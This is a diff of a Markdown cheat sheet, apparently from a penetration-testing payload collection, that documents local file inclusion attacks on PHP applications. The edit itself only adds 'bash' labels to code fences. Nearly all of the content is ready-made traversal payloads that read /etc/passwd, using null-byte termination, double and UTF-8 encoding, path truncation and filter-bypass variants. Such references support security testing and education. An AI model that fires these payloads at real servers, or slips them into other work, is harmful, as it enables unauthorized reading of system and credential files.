@@ -24,7 +24,7 @@ description: Extension Firefox
 
 In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files.
 
-```
+```bash
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
@@ -34,27 +34,27 @@ http://example.com/index.php?page=../../../etc/passwd
 
 > In versions of PHP below 5.3.4 we can terminate with null byte.
 
-```
+```bash
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
 * * *
 
 ## Double encoding
-```
+```bash
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 ***
 ## UTF-8 encoding
-```
+```bash
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 ***
 ## Path and dot truncation
 > En la mayoría de las instalaciones de PHP, un nombre de archivo de más de 4096 bytes se cortará, por lo que cualquier exceso de caracteres se desechará. 
-```
+```bash
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
@@ -62,7 +62,7 @@ http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 ***
 ## Filter bypass tricks
-```
+```bash
 http://example.com/index.php?page=....//....//etc/passwd
 http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
